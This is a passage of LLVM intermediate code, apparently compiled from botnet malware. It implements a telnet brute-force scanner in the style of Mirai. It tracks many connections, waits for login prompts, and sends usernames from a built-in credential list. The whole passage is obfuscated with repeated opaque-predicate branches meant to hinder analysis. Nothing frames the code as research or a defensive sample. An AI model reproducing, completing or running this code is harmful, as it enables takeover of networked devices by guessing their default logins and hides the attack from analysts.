  %343 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %344 = getelementptr inbounds [16 x i64], [16 x i64]* %343, i64 0, i64 0
  %345 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %344) #2, !srcloc !5
  %346 = extractvalue { i64, i64* } %345, 0
  %347 = extractvalue { i64, i64* } %345, 1
  %348 = trunc i64 %346 to i32
  store i32 %348, i32* %20, align 4
  %349 = ptrtoint i64* %347 to i64
  %350 = trunc i64 %349 to i32
  store i32 %350, i32* %21, align 4
  br label %351

; <label>:351:                                    ; preds = %342
  br label %352

; <label>:352:                                    ; preds = %351
  %353 = load i32, i32* %10, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 0
  %357 = load i32, i32* %356, align 16
  %358 = srem i32 %357, 64
  %359 = zext i32 %358 to i64
  %360 = shl i64 1, %359
  %361 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %362 = load i32, i32* %10, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 0
  %366 = load i32, i32* %365, align 16
  %367 = sdiv i32 %366, 64
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds [16 x i64], [16 x i64]* %361, i64 0, i64 %368
  %370 = load i64, i64* %369, align 8
  %371 = or i64 %370, %360
  store i64 %371, i64* %369, align 8
  %372 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %372, align 8
  %373 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %373, align 8
  %374 = load i32, i32* %10, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %375
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %376, i32 0, i32 0
  %378 = load i32, i32* %377, align 16
  %379 = add nsw i32 %378, 1
  %380 = call i32 @select(i32 %379, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %380, i32* %11, align 4
  %381 = load i32, i32* %11, align 4
  %382 = icmp eq i32 %381, 1
  br i1 %382, label %383, label %456

; <label>:383:                                    ; preds = %352
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %384 = load i32, i32* %10, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %385
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %386, i32 0, i32 0
  %388 = load i32, i32* %387, align 16
  %389 = bitcast i32* %15 to i8*
  %390 = call i32 @getsockopt(i32 %388, i32 1, i32 4, i8* %389, i32* %14) #2
  %391 = load i32, i32* %15, align 4
  %392 = icmp ne i32 %391, 0
  br i1 %392, label %393, label %408

; <label>:393:                                    ; preds = %383
  %394 = load i32, i32* %10, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %395
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %396, i32 0, i32 0
  %398 = load i32, i32* %397, align 16
  %399 = call i32 @sclose(i32 %398)
  %400 = load i32, i32* %10, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 2
  store i8 0, i8* %403, align 8
  %404 = load i32, i32* %10, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 3
  store i8 1, i8* %407, align 1
  br label %455

; <label>:408:                                    ; preds = %383
  %409 = load i32, i32* @x.63
  %410 = load i32, i32* @y.64
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %408
  %417 = load i32, i32* %10, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 0
  %421 = load i32, i32* %420, align 16
  %422 = load i32, i32* %10, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 16
  %427 = call i32 (i32, i32, ...) @fcntl(i32 %426, i32 3, i8* null)
  %428 = and i32 %427, -2049
  %429 = call i32 (i32, i32, ...) @fcntl(i32 %421, i32 4, i32 %428)
  %430 = load i32, i32* %10, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 6
  store i32 0, i32* %433, align 4
  %434 = load i32, i32* %10, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 7
  store i16 0, i16* %437, align 16
  %438 = load i32, i32* %10, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 8
  %442 = load i8*, i8** %441, align 8
  call void @llvm.memset.p0i8.i64(i8* %442, i8 0, i64 1024, i32 1, i1 false)
  %443 = load i32, i32* %10, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 2
  store i8 2, i8* %446, align 8
  %447 = load i32, i32* @x.63
  %448 = load i32, i32* @y.64
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart238, label %originalBB32alteredBB

originalBBpart238:                                ; preds = %originalBB32
  br label %1527

; <label>:455:                                    ; preds = %393
  br label %507

; <label>:456:                                    ; preds = %352
  %457 = load i32, i32* @x.63
  %458 = load i32, i32* @y.64
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %456
  %465 = load i32, i32* %11, align 4
  %466 = icmp eq i32 %465, -1
  %467 = load i32, i32* @x.63
  %468 = load i32, i32* @y.64
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %466, label %475, label %506

; <label>:475:                                    ; preds = %originalBBpart242
  %476 = load i32, i32* @x.63
  %477 = load i32, i32* @y.64
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %475
  %484 = load i32, i32* %10, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 0
  %488 = load i32, i32* %487, align 16
  %489 = call i32 @sclose(i32 %488)
  %490 = load i32, i32* %10, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 2
  store i8 0, i8* %493, align 8
  %494 = load i32, i32* %10, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 3
  store i8 1, i8* %497, align 1
  %498 = load i32, i32* @x.63
  %499 = load i32, i32* @y.64
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %506

; <label>:506:                                    ; preds = %originalBBpart246, %originalBBpart242
  br label %507

; <label>:507:                                    ; preds = %506, %455
  %508 = load i32, i32* @x.63
  %509 = load i32, i32* @y.64
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %507
  %516 = load i32, i32* %10, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 6
  %520 = load i32, i32* %519, align 4
  %521 = add i32 %520, 5
  %522 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %523 = icmp ult i32 %521, %522
  %524 = load i32, i32* @x.63
  %525 = load i32, i32* @y.64
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart258, label %originalBB48alteredBB

originalBBpart258:                                ; preds = %originalBB48
  br i1 %523, label %532, label %547

; <label>:532:                                    ; preds = %originalBBpart258
  %533 = load i32, i32* %10, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 16
  %538 = call i32 @sclose(i32 %537)
  %539 = load i32, i32* %10, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %540
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %541, i32 0, i32 2
  store i8 0, i8* %542, align 8
  %543 = load i32, i32* %10, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %544
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %545, i32 0, i32 3
  store i8 1, i8* %546, align 1
  br label %547

; <label>:547:                                    ; preds = %532, %originalBBpart258
  br label %1526

; <label>:548:                                    ; preds = %originalBBpart222
  %549 = load i32, i32* %10, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %550
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %551, i32 0, i32 6
  %553 = load i32, i32* %552, align 4
  %554 = icmp eq i32 %553, 0
  br i1 %554, label %555, label %561

; <label>:555:                                    ; preds = %548
  %556 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %557 = load i32, i32* %10, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 6
  store i32 %556, i32* %560, align 4
  br label %561

; <label>:561:                                    ; preds = %555, %548
  %562 = load i32, i32* @x.63
  %563 = load i32, i32* @y.64
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %561
  %570 = load i32, i32* %10, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 8
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @matchPrompt(i8* %574)
  %576 = icmp ne i32 %575, 0
  %577 = load i32, i32* @x.63
  %578 = load i32, i32* @y.64
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %576, label %585, label %590

; <label>:585:                                    ; preds = %originalBBpart262
  %586 = load i32, i32* %10, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 2
  store i8 7, i8* %589, align 8
  br label %590

; <label>:590:                                    ; preds = %585, %originalBBpart262
  %591 = load i32, i32* @x.63
  %592 = load i32, i32* @y.64
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %590
  %599 = load i32, i32* %10, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 16
  %604 = load i32, i32* %10, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 8
  %608 = load i8*, i8** %607, align 8
  %609 = load i32, i32* %10, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 7
  %613 = load i16, i16* %612, align 16
  %614 = zext i16 %613 to i32
  %615 = call i32 @readUntil(i32 %603, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %608, i32 1024, i32 %614)
  %616 = icmp ne i32 %615, 0
  %617 = load i32, i32* @x.63
  %618 = load i32, i32* @y.64
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %616, label %625, label %659

; <label>:625:                                    ; preds = %originalBBpart266
  %626 = load i32, i32* @x.63
  %627 = load i32, i32* @y.64
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %625
  %634 = load i32, i32* %10, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %635
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %636, i32 0, i32 6
  store i32 0, i32* %637, align 4
  %638 = load i32, i32* %10, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 7
  store i16 0, i16* %641, align 16
  %642 = load i32, i32* %10, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %643
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %644, i32 0, i32 8
  %646 = load i8*, i8** %645, align 8
  call void @llvm.memset.p0i8.i64(i8* %646, i8 0, i64 1024, i32 1, i1 false)
  %647 = load i32, i32* %10, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %648
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %649, i32 0, i32 2
  store i8 3, i8* %650, align 8
  %651 = load i32, i32* @x.63
  %652 = load i32, i32* @y.64
  %653 = sub i32 %651, 1
  %654 = mul i32 %651, %653
  %655 = urem i32 %654, 2
  %656 = icmp eq i32 %655, 0
  %657 = icmp slt i32 %652, 10
  %658 = or i1 %656, %657
  br i1 %658, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %1527

; <label>:659:                                    ; preds = %originalBBpart266
  %660 = load i32, i32* %10, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 0
  %664 = load i32, i32* %663, align 16
  %665 = load i32, i32* %10, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 8
  %669 = load i8*, i8** %668, align 8
  %670 = load i32, i32* %10, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 7
  %674 = load i16, i16* %673, align 16
  %675 = zext i16 %674 to i32
  %676 = call i32 @readUntil(i32 %664, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %669, i32 1024, i32 %675)
  %677 = icmp ne i32 %676, 0
  br i1 %677, label %678, label %696

; <label>:678:                                    ; preds = %659
  %679 = load i32, i32* %10, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 6
  store i32 0, i32* %682, align 4
  %683 = load i32, i32* %10, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 7
  store i16 0, i16* %686, align 16
  %687 = load i32, i32* %10, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 8
  %691 = load i8*, i8** %690, align 8
  call void @llvm.memset.p0i8.i64(i8* %691, i8 0, i64 1024, i32 1, i1 false)
  %692 = load i32, i32* %10, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 2
  store i8 3, i8* %695, align 8
  br label %1527

; <label>:696:                                    ; preds = %659
  %697 = load i32, i32* %10, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 0
  %701 = load i32, i32* %700, align 16
  %702 = load i32, i32* %10, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 8
  %706 = load i8*, i8** %705, align 8
  %707 = load i32, i32* %10, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 7
  %711 = load i16, i16* %710, align 16
  %712 = zext i16 %711 to i32
  %713 = call i32 @readUntil(i32 %701, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %706, i32 1024, i32 %712)
  %714 = icmp ne i32 %713, 0
  br i1 %714, label %715, label %733

; <label>:715:                                    ; preds = %696
  %716 = load i32, i32* %10, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %717
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %718, i32 0, i32 6
  store i32 0, i32* %719, align 4
  %720 = load i32, i32* %10, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %721
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %722, i32 0, i32 7
  store i16 0, i16* %723, align 16
  %724 = load i32, i32* %10, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 8
  %728 = load i8*, i8** %727, align 8
  call void @llvm.memset.p0i8.i64(i8* %728, i8 0, i64 1024, i32 1, i1 false)
  %729 = load i32, i32* %10, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 2
  store i8 5, i8* %732, align 8
  br label %1527

; <label>:733:                                    ; preds = %696
  %734 = load i32, i32* %10, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 8
  %738 = load i8*, i8** %737, align 8
  %739 = call i64 @strlen(i8* %738) #10
  %740 = trunc i64 %739 to i16
  %741 = load i32, i32* %10, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 7
  store i16 %740, i16* %744, align 16
  br label %745

; <label>:745:                                    ; preds = %733
  br label %746

; <label>:746:                                    ; preds = %745
  br label %747

; <label>:747:                                    ; preds = %746
  %748 = load i32, i32* %10, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %749
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %750, i32 0, i32 6
  %752 = load i32, i32* %751, align 4
  %753 = add i32 %752, 20
  %754 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %755 = icmp ult i32 %753, %754
  br i1 %755, label %756, label %771

; <label>:756:                                    ; preds = %747
  %757 = load i32, i32* %10, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 0
  %761 = load i32, i32* %760, align 16
  %762 = call i32 @sclose(i32 %761)
  %763 = load i32, i32* %10, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %764
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %765, i32 0, i32 2
  store i8 0, i8* %766, align 8
  %767 = load i32, i32* %10, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 3
  store i8 1, i8* %770, align 1
  br label %771

; <label>:771:                                    ; preds = %756, %747
  %772 = load i32, i32* @x.63
  %773 = load i32, i32* @y.64
  %774 = sub i32 %772, 1
  %775 = mul i32 %772, %774
  %776 = urem i32 %775, 2
  %777 = icmp eq i32 %776, 0
  %778 = icmp slt i32 %773, 10
  %779 = or i1 %777, %778
  br i1 %779, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %771
  %780 = load i32, i32* @x.63
  %781 = load i32, i32* @y.64
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %1526

; <label>:788:                                    ; preds = %originalBBpart222
  %789 = load i32, i32* @x.63
  %790 = load i32, i32* @y.64
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %788
  %797 = load i32, i32* %10, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 0
  %801 = load i32, i32* %800, align 16
  %802 = load i32, i32* %10, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 4
  %806 = load i8, i8* %805, align 2
  %807 = zext i8 %806 to i64
  %808 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %807
  %809 = load i8*, i8** %808, align 8
  %810 = load i32, i32* %10, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 4
  %814 = load i8, i8* %813, align 2
  %815 = zext i8 %814 to i64
  %816 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %815
  %817 = load i8*, i8** %816, align 8
  %818 = call i64 @strlen(i8* %817) #10
  %819 = call i64 @send(i32 %801, i8* %809, i64 %818, i32 16384)
  %820 = icmp slt i64 %819, 0
  %821 = load i32, i32* @x.63
  %822 = load i32, i32* @y.64
  %823 = sub i32 %821, 1
  %824 = mul i32 %821, %823
  %825 = urem i32 %824, 2
  %826 = icmp eq i32 %825, 0
  %827 = icmp slt i32 %822, 10
  %828 = or i1 %826, %827
  br i1 %828, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %820, label %829, label %844

; <label>:829:                                    ; preds = %originalBBpart278
  %830 = load i32, i32* %10, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 0
  %834 = load i32, i32* %833, align 16
  %835 = call i32 @sclose(i32 %834)
  %836 = load i32, i32* %10, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 2
  store i8 0, i8* %839, align 8
  %840 = load i32, i32* %10, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 3
  store i8 1, i8* %843, align 1
  br label %1527

; <label>:844:                                    ; preds = %originalBBpart278
